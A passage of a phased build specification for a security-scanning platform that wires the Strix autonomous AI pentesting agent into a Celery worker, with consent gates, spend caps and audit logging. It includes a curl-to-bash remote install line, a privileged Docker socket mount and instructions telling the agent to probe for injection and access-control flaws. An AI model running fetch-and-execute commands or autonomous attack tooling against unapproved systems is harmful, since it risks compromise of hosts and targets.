    User A creates scan
    User B tries to GET that scan_id
    Assert: status 403 or 404

11. test_findings_filter_by_severity
    Create 3 findings: CRITICAL, HIGH, MEDIUM
    GET /api/v1/findings?severity=CRITICAL
    Assert: only 1 finding returned

12. test_findings_export_csv
    Create 5 findings for scan
    GET /api/v1/findings/export?format=csv
    Assert: Content-Type is text/csv
    Assert: response body has 6 lines (header + 5 rows)

13. test_report_download_returns_pdf
    Generate mock report with pdf_path set
    GET /api/v1/reports/{scan_id}/download
    Assert: Content-Type is application/pdf
    Assert: Content-Disposition has filename

14. test_dashboard_stats_correct
    Create 3 scans with known finding counts
    GET /api/v1/dashboard/stats
    Assert: total_scans == 3
    Assert: total_findings matches sum

15. test_websocket_connects_and_receives
    Connect WebSocket with valid token
    Assert: initial scan_state message received
    Assert: message has progress field

16. test_websocket_rejects_invalid_token
    Connect WebSocket with token="invalid"
    Assert: connection closed with code 4001

17. test_tool_list_returns_all_plugins
    GET /api/v1/tools/
    Assert: response has >= 30 items
    Assert: each item has name, category, health_status

18. test_finding_mark_false_positive
    Create confirmed finding
    PATCH /api/v1/findings/{id}
      body: {is_false_positive: true}
    Assert: finding.is_false_positive == True
    Assert: scan.total_findings decremented

19. test_logout_blacklists_token
    Login, get token
    POST /api/v1/auth/logout with token
    GET /api/v1/scans with same token
    Assert: second request returns 401

20. test_rate_limit_on_login
    POST /api/v1/auth/login 11 times in 1 minute
    Assert: 11th request returns 429

Run: pytest tests/test_api.py -v
All 20 must pass. Phase 10 complete when all pass.

Manual verification:
  Start the API server:
    docker compose up backend
  
  Open Swagger UI:
    http://localhost:8000/api/docs
  
  Verify all endpoints visible and documented
  Register a user via Swagger UI
  Login and copy token
  Create a test scan for scanme.nmap.org
  Watch progress via:
    GET /api/v1/scans/{id}/progress (poll)
    WS /ws/scans/{id}/live (WebSocket test client)
```

---

## Full Phase Summary

| Phase | Key Files | Core Responsibility | Verify At |
|---|---|---|---|
| Phase 9 | report_agent, finding_aggregator, ai_report_generator, ai_prompts, attack_path_builder, risk_prioritizer, pdf_builder, report_notifier | Pull all findings → AI analysis → PDF → notify | Step 9.8 only |
| Phase 10 | main.py, app_factory, dependencies, schemas, auth, scans, assets, findings, reports, websocket, dashboard, tools, middleware, settings_router | Expose entire platform via REST API + WebSocket | Step 10.12 only |

---

## Pipeline Complete — End to End Flow

```
User submits target via POST /api/v1/scans
          │
          ▼
Orchestrator.start_scan()
          │
          ▼
Phase 1: Recon Agent (subfinder, amass, dnsx...)
          │ recon_complete event
          ▼
Phase 2: Enum Agent (httpx, naabu, nmap, katana...)
          │ enum_complete event
          │
    ┌─────┴──────┐
    ▼            ▼
Phase 3:      Phase 4:
Vuln Agent    Secret & Cloud Agent
(parallel)    (parallel)
    │            │
    └─────┬──────┘
          │ both_complete
          ▼
Phase 5: Exploit Agent (conditional, PoC only)
          │
          ▼
Phase 6: Report Agent
         AI analysis → PDF → Notifications
          │
          ▼
Scan marked COMPLETED
Frontend receives scan_complete via WebSocket
User downloads PDF via GET /api/v1/reports/{id}/download
```

Now I have a thorough understanding of the actual Strix source. Let me write the deep implementation prompts.

---

# PHASE 11 — STRIX INTEGRATION

---

### Step 11.0 — Phase 11 Master Context

```
PHASE 11 — STRIX INTEGRATION (Autonomous AI Pentesting Agent)

Phases 0-10 complete. Full pipeline + API + frontend working.
Now integrating Strix v1.5.3 (strix-agent on PyPI) as a
first-class, gated, budgeted module inside AgentSec AI.

CONFIRMED FACTS ABOUT STRIX (from reading tools/strix-main/):

Binary interface:
  strix --target <url|path> [flags]
  Installed via: pip install strix-agent
  OR: curl -sSL https://strix.ai/install | bash

Key CLI flags (confirmed from skills/penetration-testing-with-strix/SKILL.md):
  -t / --target        URL, repo, local path, domain, IP
  -n / --non-interactive  Headless mode (REQUIRED for automation)
  -m / --scan-mode     quick | standard | deep
  --instruction        Scope/focus hints string
  --instruction-file   Path to instruction markdown file
  --max-budget USD     Hard LLM spend cap (wraps up cleanly)
  --max-turns N        Per-agent turn cap (default: 500)
  --run-name NAME      Names the output directory

Exit codes (confirmed, use these exactly):
  0 → finished, no validated vulnerabilities found
  1 → fatal error (Docker down, bad config, missing env)
  2 → vulnerabilities found

Output artifacts (confirmed from strix/report/writer.py
and strix/core/paths.py):
  strix_runs/{run-name}/
    run.json              → metadata, status, cost, targets
    penetration_test_report.md → executive report
    vulnerabilities/
      vuln-0001.md        → one file per finding
      vuln-0002.md
    vulnerabilities.json  → ALL findings as structured JSON
    vulnerabilities.csv   → CSV index
    findings.sarif        → SARIF 2.1.0

Confirmed vulnerability JSON shape
(from strix/report/state.py add_vulnerability_report()):
  {
    "id": "vuln-0001",
    "title": str,
    "severity": "critical"|"high"|"medium"|"low"|"info",
    "timestamp": str,
    "description": str | None,
    "impact": str | None,
    "target": str | None,
    "technical_analysis": str | None,
    "poc_description": str | None,
    "poc_script_code": str | None,
    "remediation_steps": str | None,
    "evidence": str | None,
    "assumptions": str | None,
    "fix_effort": str | None,
    "cvss": float | None,
    "cvss_breakdown": dict | None,
    "endpoint": str | None,
    "method": str | None,
    "cve": str | None,
    "cwe": str | None,
    "code_locations": list | None,
    "finding_class": "dynamic" | "static" | ...,
    "agent_id": str | None,
    "agent_name": str | None
  }

Confirmed run.json shape (from strix/report/state.py):
  {
    "run_id": str,
    "run_name": str,
    "start_time": str,
    "end_time": str | None,
    "status": "running"|"completed"|"stopped"|"failed",
    "auth_mode": str,
    "targets_info": list,
    "llm_usage": {...}  → contains cost_usd
  }

LLM configuration (from strix/config/settings.py):
  STRIX_LLM env var → model string e.g. "anthropic/claude-sonnet-4-6"
  LLM_API_KEY env var → provider API key
  (Reuse ANTHROPIC_API_KEY from .env if using Claude)
  STRIX_REASONING_EFFORT → "none"|"minimal"|"low"|"medium"|"high"|"xhigh"|"max"

Docker requirement:
  Strix manages its OWN sandbox container internally.
  The host running strix CLI must have Docker available.
  The strix_worker Celery container needs Docker-in-Docker
  or Docker socket mount.
  Sandbox image: defined in containers/Dockerfile
  (kalilinux base with Caido proxy + full toolset)

INTEGRATION PHILOSOPHY:
  Strix is NOT reimplemented. AgentSec AI calls it as a
  subprocess black-box, exactly like any other plugin.
  We invoke its CLI, wait for exit, read its output files,
  normalize findings into our Finding model, and store them.
  We NEVER import from tools/strix-main/strix/ directly.
  tools/strix-main/ is READ-ONLY reference only.

SAFETY RULES (non-negotiable):
  1. STRIX_AGENT_ENABLED = False by default
  2. Organization must confirm authorized scope via a
     dedicated API endpoint before Strix can run
  3. Every run carries --non-interactive --max-budget
     --max-turns (no unbounded runs ever)
  4. max_retries = 0 (never retry autonomous agent runs)
  5. Every invocation logged to AuditLog (start + end)
  6. Test only against: scanme.nmap.org or local DVWA
     docker run -d -p 8080:80 vulnerables/web-dvwa

Token rule:
Generate in order, wait for "next" between each:
  Step 11.1: .env additions + Settings model update
  Step 11.2: Strix Plugin Wrapper
  Step 11.3: Docker/Compose integration
  Step 11.4: Strix Agent Celery Task
  Step 11.5: Decision Engine extension
  Step 11.6: Strix Output Normalizer + Deduplicator
  Step 11.7: AuditLog model addition
  Step 11.8: Verification
```

---

### Step 11.1 — .env Additions + Settings Update

```
PHASE 11 — STEP 1

Generate additions to:
  .env
  .env.example
  backend/config/settings.py (str_replace additions only)

─────────────────────────────────────────

.env additions (append to existing .env):

# ── Strix Autonomous Agent ────────────────────────────────
# Set True only after reading the safety rules in Phase 11
STRIX_AGENT_ENABLED=False

# LLM model for Strix's own reasoning engine
# Reuses ANTHROPIC_API_KEY already defined above if using Claude
# Format: <provider>/<model> following LiteLLM conventions
# Examples:
#   anthropic/claude-sonnet-4-6
#   openai/gpt-4o
#   vertex_ai/gemini-pro
STRIX_LLM=anthropic/claude-sonnet-4-6

# Hard LLM spend cap per scan (USD). Strix wraps up cleanly at limit.
# Start with 2.00 USD when first testing the integration.
STRIX_MAX_BUDGET_USD=10.00

# Per-agent turn cap (Strix default is 500, we cap lower for safety)
STRIX_MAX_TURNS=200

# Total wall-clock timeout for a Strix run (seconds)
STRIX_TIMEOUT_SECONDS=3600

# quick | standard | deep
STRIX_DEFAULT_SCAN_MODE=standard

# Strix reasoning effort: none|minimal|low|medium|high|xhigh|max
STRIX_REASONING_EFFORT=high

# Where Strix writes its run artifacts on the strix_worker container
# This must match the volume mount in docker-compose.yml
STRIX_RUNS_BASE_DIR=/app/strix_runs

─────────────────────────────────────────

settings.py additions (str_replace into existing Settings class):

Add new nested settings class BEFORE the final
Settings class definition:

class StrixSettings(BaseSettings):
  model_config = _BASE_CONFIG  # same pattern as other nested classes
  
  enabled: bool = Field(
    default=False, alias="STRIX_AGENT_ENABLED"
  )
  llm_model: str = Field(
    default="anthropic/claude-sonnet-4-6",
    alias="STRIX_LLM"
  )
  max_budget_usd: float = Field(
    default=10.0, alias="STRIX_MAX_BUDGET_USD"
  )
  max_turns: int = Field(
    default=200, alias="STRIX_MAX_TURNS"
  )
  timeout_seconds: int = Field(
    default=3600, alias="STRIX_TIMEOUT_SECONDS"
  )
  default_scan_mode: str = Field(
    default="standard", alias="STRIX_DEFAULT_SCAN_MODE"
  )
  reasoning_effort: str = Field(
    default="high", alias="STRIX_REASONING_EFFORT"
  )
  runs_base_dir: str = Field(
    default="/app/strix_runs", alias="STRIX_RUNS_BASE_DIR"
  )

Add to the main Settings class:
  strix: StrixSettings = StrixSettings()

Generate the additions only. Stop after.
```

---

### Step 11.2 — Strix Plugin Wrapper

```
PHASE 11 — STEP 2

Generate: backend/plugins/strix_plugin.py

Follows the EXACT same AbstractPlugin contract (Phase 3).

─────────────────────────────────────────

from backend.plugins.base_plugin import (
  AbstractPlugin, PluginInput, PluginOutput, PluginMetadata
)
from backend.config.settings import settings
import asyncio, json, os, uuid
from pathlib import Path
from datetime import datetime

─────────────────────────────────────────

metadata = PluginMetadata(
  name = "strix_plugin",
  version = "1.5.3",
  category = "AUTONOMOUS",
  binary_name = "strix",
  default_timeout = settings.strix.timeout_seconds,
  supports_json_output = True,
  fallback_plugin = None,
  description = (
    "Autonomous AI pentesting agent. Manages its own "
    "sandboxed Docker environment. Finds, validates, and "
    "proves vulnerabilities with working PoCs."
  )
)

─────────────────────────────────────────

build_command(input: PluginInput) → list[str]:

  binary_path = self.get_binary_path()
  
  scan_mode = input.extra_params.get(
    "scan_mode", settings.strix.default_scan_mode
  )
  max_budget = input.extra_params.get(
    "max_budget", settings.strix.max_budget_usd
  )
  max_turns = input.extra_params.get(
    "max_turns", settings.strix.max_turns
  )
  run_name = input.extra_params.get(
    "run_name",
    f"agentsec-{input.scan_id[:8]}-{uuid.uuid4().hex[:6]}"
  )
  instruction = input.extra_params.get(
    "instruction", _build_default_instruction(input)
  )
  
  cmd = [
    binary_path,
    "--target", input.target,
    "--non-interactive",
    "--scan-mode", scan_mode,
    "--max-budget", str(max_budget),
    "--max-turns", str(max_turns),
    "--run-name", run_name,
    "--instruction", instruction,
  ]
  
  # If caller provided an instruction file path
  if input.extra_params.get("instruction_file"):
    cmd += ["--instruction-file",
            input.extra_params["instruction_file"]]
  
  # Multi-target: if OpenAPI spec also provided
  if input.extra_params.get("openapi_spec_path"):
    cmd += ["--target",
            input.extra_params["openapi_spec_path"]]
  
  # Store run_name so parse_output can find the directory
  self._last_run_name = run_name
  
  return cmd

─────────────────────────────────────────

_build_default_instruction(input: PluginInput) → str:

  base_targets = input.extra_params.get(
    "known_subdomains_summary", ""
  )
  
  return (
    f"AUTHORIZED PENETRATION TEST — SCOPE: {input.target} only.\n\n"
    f"Focus on OWASP Top 10 2025 vulnerabilities:\n"
    f"- Broken Access Control (IDOR, privilege escalation)\n"
    f"- Injection (SQLi, CMDi, SSTI, XXE)\n"
    f"- Authentication Failures (JWT, session, OAuth)\n"
    f"- Security Misconfiguration (exposed panels, files)\n"
    f"- XSS, SSRF, CORS misconfigurations\n"
    f"- API Security (broken auth/authz, rate limiting)\n\n"
    f"STRICT CONSTRAINTS:\n"
    f"- Only test {input.target} and its subdomains.\n"
    f"- Do NOT pivot to any external host.\n"
    f"- Do NOT delete, modify, or exfiltrate real data.\n"
    f"- Do NOT test payment or checkout endpoints.\n"
    f"- Stop immediately if you detect you are outside scope.\n"
    + (f"\nKnown subdomains to prioritize:\n{base_targets}"
       if base_targets else "")
  )

─────────────────────────────────────────

execute(input: PluginInput) → async → PluginOutput:
  
  Override the base execute() because Strix has a
  different output model: it writes to FILES not stdout.
  We still use _execute_subprocess() for the process
  itself, but then read output from the run directory.
  
  start_time = asyncio.get_event_loop().time()
  
  Try:
    cmd = self.build_command(input)
    
    # Set environment variables Strix needs
    env = os.environ.copy()
    env["STRIX_LLM"] = settings.strix.llm_model
    env["LLM_API_KEY"] = settings.ANTHROPIC_API_KEY
    env["STRIX_REASONING_EFFORT"] = settings.strix.reasoning_effort
    
    Log: f"Strix starting: {' '.join(cmd[:5])}..."
    Log: f"Run name: {self._last_run_name}"
    Log: f"Budget: ${settings.strix.max_budget_usd} | "
         f"Turns: {settings.strix.max_turns} | "
         f"Mode: {settings.strix.default_scan_mode}"
    
    stdout, stderr, returncode = await _execute_subprocess_with_env(
      cmd, input.timeout, env
    )
    
    execution_time = asyncio.get_event_loop().time() - start_time
    
    # Build run directory path
    run_dir = Path(settings.strix.runs_base_dir) / \
               "strix_runs" / self._last_run_name
    
    # Read structured output from files
    parsed_data = []
    raw_output = stdout + stderr
    
    # Primary: read vulnerabilities.json
    vuln_json_path = run_dir / "vulnerabilities.json"
    if vuln_json_path.exists():
      raw_output += f"\n\n[vulnerabilities.json]\n"
      raw_output += vuln_json_path.read_text(encoding="utf-8")
      parsed_data = parse_output(raw_output)
    
    # Also save executive report as evidence
    report_path = run_dir / "penetration_test_report.md"
    if report_path.exists():
      raw_output += f"\n\n[penetration_test_report.md]\n"
      raw_output += report_path.read_text(encoding="utf-8")
    
    # Read run.json for cost/status metadata
    run_record = _read_run_json(run_dir)
    
    success = returncode in (0, 2)
      # Exit 0: clean, no vulns
      # Exit 2: vulns found — this is SUCCESS for us
      # Exit 1: fatal error
    
    if returncode == 1:
      error_msg = f"Strix fatal error (exit 1). Stderr: {stderr[:500]}"
    else:
      error_msg = None
    
    quality_score = _calculate_strix_quality(
      returncode, len(parsed_data), run_record
    )
    
    output = PluginOutput(
      scan_id=input.scan_id,
      plugin_name="strix_plugin",
      success=success,
      raw_output=raw_output,
      parsed_data=parsed_data,
      record_count=len(parsed_data),
      execution_time=execution_time,
      error_message=error_msg,
      command_executed=" ".join(cmd[:6]) + " ...",
      output_file_path=str(run_dir),
      quality_score=quality_score
    )
    
    # Attach run metadata to output for agent to use
    output.extra = {
      "run_name": self._last_run_name,
      "run_dir": str(run_dir),
      "strix_status": run_record.get("status", "unknown"),
      "cost_usd": _extract_cost(run_record),
      "exit_code": returncode
    }
    
    return output
  
  Except Exception as e:
    return PluginOutput(
      scan_id=input.scan_id,
      plugin_name="strix_plugin",
      success=False,
      raw_output="",
      parsed_data=[],
      record_count=0,
      execution_time=0.0,
      error_message=str(e),
      command_executed="",
      quality_score=0.0
    )

─────────────────────────────────────────

parse_output(raw: str) → list[dict]:
  
  Try to find and parse vulnerabilities.json content
  from the raw_output string (we embedded it above).
  
  # Find the JSON section in raw_output
  marker = "[vulnerabilities.json]"
  if marker not in raw:
    Log warning: "No vulnerabilities.json found in Strix output"
    return []
  
  json_section = raw.split(marker, 1)[1]
  
  # Find the next section marker if present
  next_marker = "[penetration_test_report.md]"
  if next_marker in json_section:
    json_section = json_section.split(next_marker, 1)[0]
  
  json_section = json_section.strip()
  
  If not json_section:
    return []
  
  Try:
    raw_findings = json.loads(json_section)
    If not isinstance(raw_findings, list):
      return []
    
    normalized = []
    for f in raw_findings:
      If not isinstance(f, dict): continue
      
      # Build evidence block from all available fields
      evidence_parts = []
      If f.get("evidence"):
        evidence_parts.append(f"Evidence:\n{f['evidence']}")
      If f.get("poc_description"):
        evidence_parts.append(f"PoC:\n{f['poc_description']}")
      If f.get("poc_script_code"):
        evidence_parts.append(f"PoC Script:\n{f['poc_script_code']}")
      If f.get("technical_analysis"):
        evidence_parts.append(f"Analysis:\n{f['technical_analysis']}")
      
      normalized.append({
        "title": f.get("title", "Unknown Vulnerability"),
        "severity": f.get("severity", "medium").upper(),
        "description": f.get("description", ""),
        "impact": f.get("impact", ""),
        "affected_url": f.get("endpoint") or f.get("target"),
        "affected_parameter": f.get("method"),
        "evidence": "\n\n".join(evidence_parts),
        "remediation_steps": f.get("remediation_steps", ""),
        "cvss_score": f.get("cvss"),
        "cve_id": f.get("cve"),
        "cwe_id": f.get("cwe"),
        "poc_script": f.get("poc_script_code"),
        "fix_effort": f.get("fix_effort"),
        "finding_class": f.get("finding_class", "dynamic"),
        "strix_id": f.get("id"),
        "strix_agent": f.get("agent_name"),
        "assumptions": f.get("assumptions"),
        "tool": "strix"
      })
    
    Return normalized
  
  Except json.JSONDecodeError as e:
    Log warning: f"Failed to parse Strix vulnerabilities.json: {e}"
    Return []

─────────────────────────────────────────

_read_run_json(run_dir: Path) → dict:
  run_json_path = run_dir / "run.json"
  If not run_json_path.exists():
    return {}
  Try:
    return json.loads(run_json_path.read_text("utf-8"))
  Except:
    return {}

_extract_cost(run_record: dict) → float:
  llm_usage = run_record.get("llm_usage", {})
  If not llm_usage: return 0.0
  # Strix tracks cost in llm_usage — look for cost_usd key
  return float(llm_usage.get("cost_usd", 0) or 0)

_calculate_strix_quality(returncode, finding_count, run_record) → float:
  If returncode == 1: return 0.0 (fatal error)
  status = run_record.get("status", "unknown")
  If status == "failed": return 0.1
  If status == "stopped": return 0.5 (budget/turn limit hit)
  If status == "completed" and finding_count >= 0: return 0.9
  return 0.5

─────────────────────────────────────────

health_check() → async → bool:
  
  STEP 1: Check binary exists
    binary = shutil.which("strix")
    If not binary: return False
  
  STEP 2: Check strix --version runs
    proc = await asyncio.create_subprocess_exec(
      binary, "--version",
      stdout=asyncio.subprocess.PIPE,
      stderr=asyncio.subprocess.PIPE
    )
    stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=10)
    If proc.returncode != 0: return False
  
  STEP 3: Check required env vars
    If not settings.strix.llm_model:
      Log warning: "STRIX_LLM not configured"
      return False
    If not settings.ANTHROPIC_API_KEY and "anthropic" in llm_model:
      Log warning: "ANTHROPIC_API_KEY not set but Strix LLM is anthropic"
      return False
  
  STEP 4: Check Docker available (Strix needs it)
    docker_check = await asyncio.create_subprocess_exec(
      "docker", "info",
      stdout=asyncio.subprocess.DEVNULL,
      stderr=asyncio.subprocess.DEVNULL
    )
    await docker_check.wait()
    If docker_check.returncode != 0:
      Log warning: "Docker not running — Strix cannot operate"
      return False
  
  Return True

─────────────────────────────────────────

_execute_subprocess_with_env(cmd, timeout, env) → async:
  Use asyncio.create_subprocess_exec with:
    env = env (our patched env)
    stdout = asyncio.subprocess.PIPE
    stderr = asyncio.subprocess.PIPE
  
  Try:
    await asyncio.wait_for(proc.communicate(), timeout=timeout)
    return stdout.decode("utf-8", errors="replace"),
           stderr.decode("utf-8", errors="replace"),
           proc.returncode
  Except asyncio.TimeoutError:
    proc.kill()
    return "", "TIMEOUT", -1

Generate strix_plugin.py only. Stop after.
```

---

### Step 11.3 — Docker + Compose Integration

```
PHASE 11 — STEP 3

Generate these files:
  docker/Dockerfile.strix
  docker-compose.yml strix_worker service addition (str_replace)
  .env.example additions

─────────────────────────────────────────

docker/Dockerfile.strix:

# AgentSec AI — Strix Worker Container
# Runs the Celery strix_queue worker.
# This container shells out to the `strix` CLI.
# Strix ITSELF manages a nested sandbox container
# (kalilinux-based). This requires Docker socket access.
#
# SECURITY NOTE: Mounting /var/run/docker.sock gives this
# container the ability to start sibling containers on the
# host Docker daemon. Treat this container as privileged.
# For production multi-tenant deployments, run Strix on a
# dedicated, isolated host instead.

FROM python:3.11-slim

ENV PYTHONDONTWRITEBYTECODE=1
ENV PYTHONUNBUFFERED=1

WORKDIR /app

# Install Docker CLI (for Strix to call docker internally)
RUN apt-get update && apt-get install -y \
    curl \
    wget \
    ca-certificates \
    gnupg \
    && install -m 0755 -d /etc/apt/keyrings \
    && curl -fsSL https://download.docker.com/linux/debian/gpg \
       | gpg --dearmor -o /etc/apt/keyrings/docker.gpg \
    && chmod a+r /etc/apt/keyrings/docker.gpg \
    && echo "deb [arch=$(dpkg --print-architecture) \
       signed-by=/etc/apt/keyrings/docker.gpg] \
       https://download.docker.com/linux/debian \
       $(. /etc/os-release && echo "$VERSION_CODENAME") stable" \
       | tee /etc/apt/sources.list.d/docker.list > /dev/null \
    && apt-get update \
    && apt-get install -y docker-ce-cli \
    && rm -rf /var/lib/apt/lists/*

# Install Python dependencies
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

# Install Strix (pinned version matching tools/strix-main/)
RUN pip install --no-cache-dir "strix-agent==1.5.3"

# Verify strix binary is available
RUN strix --version

# Create strix_runs output directory
RUN mkdir -p /app/strix_runs

# Create non-root user
RUN useradd -m -u 1001 -s /bin/bash appuser \
    && chown -R appuser:appuser /app

# NOTE: appuser needs docker group access to call Docker CLI.
# We add appuser to docker group. The host docker.sock must
# have permissions allowing the docker group to write to it.
RUN groupadd -f docker && usermod -aG docker appuser

USER appuser

# Copy backend code
COPY --chown=appuser:appuser backend/ /app/backend/

ENV STRIX_RUNS_BASE_DIR=/app
# Note: Strix writes to ./strix_runs relative to CWD
# so running from /app means /app/strix_runs/

CMD ["celery", "-A", "backend.workers.celery_app", "worker",
     "--loglevel=info", "--queues=strix_queue",
     "--concurrency=1"]
# concurrency=1: Strix scans are resource-intensive.
# One scan at a time per container is intentional.

─────────────────────────────────────────

docker-compose.yml — add this service:
(str_replace: add after the existing worker_report service)

  strix_worker:
    build:
      context: .
      dockerfile: docker/Dockerfile.strix
    env_file: .env
    environment:
      # LLM settings for Strix's own reasoning
      STRIX_LLM: ${STRIX_LLM:-anthropic/claude-sonnet-4-6}
      LLM_API_KEY: ${ANTHROPIC_API_KEY}
      STRIX_REASONING_EFFORT: ${STRIX_REASONING_EFFORT:-high}
    volumes:
      # Docker socket: required for Strix to manage its sandbox
      # SECURITY: This grants container-level Docker access.
      # Do not expose this container to untrusted users.
      - /var/run/docker.sock:/var/run/docker.sock
      # Backend code (hot-reload in dev)
      - ./backend:/app/backend
      # Strix runs output (persisted across restarts)
      - strix_runs_data:/app/strix_runs
    depends_on:
      backend:
        condition: service_started
      redis:
        condition: service_healthy
    restart: unless-stopped
    networks:
      - agentsec_network
    # Resource limits — Strix scans are CPU+memory intensive
    deploy:
      resources:
        limits:
          memory: 4G
          cpus: "2.0"

# Add to the volumes section at the bottom:
volumes:
  strix_runs_data:
    driver: local

─────────────────────────────────────────

Also add strix_queue to Celery task routing in
backend/workers/celery_app.py (str_replace):

Add to the queues definition:
  strix_queue → priority 6 (lowest, these are long-running)

Add to task routing:
  "strix.*" → strix_queue

Generate all files. Stop after.
```

---

### Step 11.4 — AuditLog Model

```
PHASE 11 — STEP 4

Generate: backend/models/audit_log.py

(This was referenced in Phase 2 and 8 but never
explicitly generated. Now we make it concrete because
Strix requires mandatory audit logging.)

AuditLog SQLAlchemy model:

Inherits Base + TimestampMixin (from Phase 1)

Fields:
  id: UUID primary key
  scan_id: UUID, indexed, nullable
    (nullable because some audit events are platform-level,
     not scan-level, e.g. org scope confirmation)
  organization_id: UUID, nullable, indexed
  user_id: UUID, nullable
  action: str, max 100, indexed
    Examples:
      "strix_run_started"
      "strix_run_completed"
      "strix_run_failed"
      "exploit_poc_attempted"
      "org_scope_confirmed"
      "scan_created"
      "scan_cancelled"
  
  phase: str, nullable, max 100
    (RECON / ENUM / VULN / STRIX / EXPLOIT / REPORT)
  
  decision: str, nullable, max 2000
    (What the AI/orchestrator decided)
  
  reason: str, nullable, max 2000
    (Why — the AI reasoning explanation)
  
  tools_selected: JSON, nullable
    (List of tool names selected in this decision)
  
  metadata: JSON, nullable
    (Arbitrary additional data per action type)
    For strix_run_started:
      {target, scan_mode, max_budget, max_turns,
       instruction_preview (first 100 chars)}
    For strix_run_completed:
      {status, cost_usd, turns_used, finding_count,
       run_name, run_dir}
    For strix_run_failed:
      {error, exit_code, partial_findings}
    For org_scope_confirmed:
      {signed_by, confirmation_statement_hash,
       confirmed_at}
  
  severity: str, nullable, max 20
    (INFO / WARNING / CRITICAL for the event itself)
  
  ip_address: str, nullable, max 45
    (User IP for user-initiated actions)

Indexes:
  (scan_id, action)
  (organization_id, created_at)
  (action, created_at)

Add to backend/models/__init__.py imports.
Add to Alembic via: alembic revision --autogenerate
  -m "add_audit_log"

Also create: backend/utils/audit.py

AuditLogger class:

log(
  action: str,
  scan_id: UUID | None = None,
  organization_id: UUID | None = None,
  user_id: UUID | None = None,
  phase: str | None = None,
  decision: str | None = None,
  reason: str | None = None,
  tools_selected: list | None = None,
  metadata: dict | None = None,
  severity: str = "INFO",
  db: AsyncSession
) → async → AuditLog:

  record = AuditLog(
    scan_id=scan_id,
    organization_id=organization_id,
    user_id=user_id,
    action=action,
    phase=phase,
    decision=decision,
    reason=reason,
    tools_selected=tools_selected,
    metadata=metadata,
    severity=severity
  )
  db.add(record)
  await db.commit()
  
  Also log to Python logger:
    log_str = f"AUDIT | {action} | scan={scan_id} | {severity}"
    If metadata: log_str += f" | {metadata}"
    logger.info(log_str)
  
  Return record

Generate audit_log.py and audit.py. Stop after.
```

---

### Step 11.5 — Strix Agent Celery Task

```
PHASE 11 — STEP 5

Generate: backend/workers/strix_agent.py

─────────────────────────────────────────

Task definition:

@celery_app.task(
  bind=True,
  name="strix.start",
  queue="strix_queue",
  max_retries=0,
  # NEVER auto-retry autonomous agent runs.
  # A retry = double LLM spend. Always zero.
  soft_time_limit=settings.strix.timeout_seconds - 120,
  time_limit=settings.strix.timeout_seconds
)
def start_strix(self, scan_id: str,
                context_dict: dict) → dict:
  return asyncio.run(
    _async_start_strix(self, scan_id, context_dict)
  )

─────────────────────────────────────────

Async implementation _async_start_strix():

STEP 0: Safety Gates (ALL must pass, log which fails)

  Gate 1 — Feature enabled:
    If not settings.strix.enabled:
      Log: "Gate 1 BLOCKED: STRIX_AGENT_ENABLED=False"
      Return {"status": "disabled",
              "reason": "STRIX_AGENT_ENABLED is False"}

  Gate 2 — Org consent:
    async with get_db() as db:
      scan = await db.get(Scan, UUID(scan_id))
      org = await db.get(Organization, scan.organization_id)
    
    If not org or not org.authorized_scope_confirmed:
      Log: "Gate 2 BLOCKED: org scope not confirmed"
      Return {"status": "blocked_unauthorized",
              "reason": "Organization must confirm authorized scope"}

  Gate 3 — Target re-validation:
    from backend.utils.validators import validate_scan_target
    If not validate_scan_target(scan.target):
      Log: f"Gate 3 BLOCKED: target {scan.target} fails validator"
      Return {"status": "blocked_scope",
              "reason": "Target failed scope validation"}

  Gate 4 — Strix health check:
    plugin = registry.get("strix_plugin")
    is_healthy = await health_checker.check_one("strix_plugin")
    If not is_healthy.is_healthy:
      Log: f"Gate 4 BLOCKED: {is_healthy.error}"
      Return {"status": "blocked_unhealthy",
              "reason": f"Strix not available: {is_healthy.error}"}

  Log: "All 4 safety gates passed for scan {scan_id}"

STEP 1: Initialize
  Get DB session, EventBus, PluginExecutor
  
  Update Scan:
    current_phase = "Autonomous AI Testing (Strix)"
    current_tool = "Strix Agent"
  
  Publish WebSocket update:
    {type: "phase_started",
     phase: "strix",
     message: "Strix autonomous agent beginning..."}
  
  # Log scan start to AuditLog
  await audit_logger.log(
    action="strix_run_started",
    scan_id=UUID(scan_id),
    organization_id=org.id,
    phase="STRIX",
    severity="INFO",
    metadata={
      "target": scan.target,
      "scan_mode": context_dict.get(
        "strix_scan_mode", settings.strix.default_scan_mode
      ),
      "max_budget_usd": settings.strix.max_budget_usd,
      "max_turns": settings.strix.max_turns,
      "instruction_preview": _build_instruction(
        scan.target, context_dict
      )[:100]
    },
    db=db
  )

STEP 2: Build PluginInput

  Load ScanContext from Redis:
    context_json = await redis.get(
      f"agentsec:context:{scan_id}"
    )
    context = ScanContext(**json.loads(context_json))
  
  # Build instruction that gives Strix context from our
  # earlier phases (saves Strix budget on rediscovery)
  known_subdomains = await _load_known_subdomains(
    scan_id, db, limit=50
  )
  known_endpoints = await _load_interesting_endpoints(
    scan_id, db, limit=30
  )
  known_findings = await _load_existing_findings_summary(
    scan_id, db
  )
  
  instruction = _build_scoped_instruction(
    target=scan.target,
    known_subdomains=known_subdomains,
    known_endpoints=known_endpoints,
    known_findings=known_findings,
    extra_instruction=context_dict.get("strix_instruction", "")
  )
  
  # Write instruction to temp file (better than inline for long text)
  instruction_file = (
    f"/tmp/agentsec_{scan_id}_strix_instruction.md"
  )
  Path(instruction_file).write_text(instruction)
  
  plugin_input = PluginInput(
    scan_id=scan_id,
    target=scan.target,
    extra_params={
      "scan_mode": context_dict.get(
        "strix_scan_mode", settings.strix.default_scan_mode
      ),
      "max_budget": settings.strix.max_budget_usd,
      "max_turns": settings.strix.max_turns,
      "instruction_file": instruction_file,
      "run_name": f"agentsec-{scan_id[:8]}",
    },
    timeout=settings.strix.timeout_seconds
  )

STEP 3: Run Strix via PluginExecutor

  Publish ToolStartedEvent("strix_plugin")
  
  Log: f"Strix running against {scan.target}..."
  Log: f"Budget: ${settings.strix.max_budget_usd} | "
       f"Mode: {plugin_input.extra_params['scan_mode']}"
  
  output = await executor.run("strix_plugin", plugin_input)
  
  If not output.success:
    If output.error_message and "TIMEOUT" in output.error_message:
      Publish ToolFailedEvent("strix_plugin", "timeout")
    Else:
      Publish ToolFailedEvent("strix_plugin", output.error_message)

STEP 4: Read actual cost from run.json
  
  cost_usd = output.extra.get("cost_usd", 0.0) if output.extra else 0.0
  strix_status = output.extra.get("strix_status", "unknown") if output.extra else "unknown"
  
  Log: f"Strix finished. Status: {strix_status} | "
       f"Cost: ${cost_usd:.4f} | "
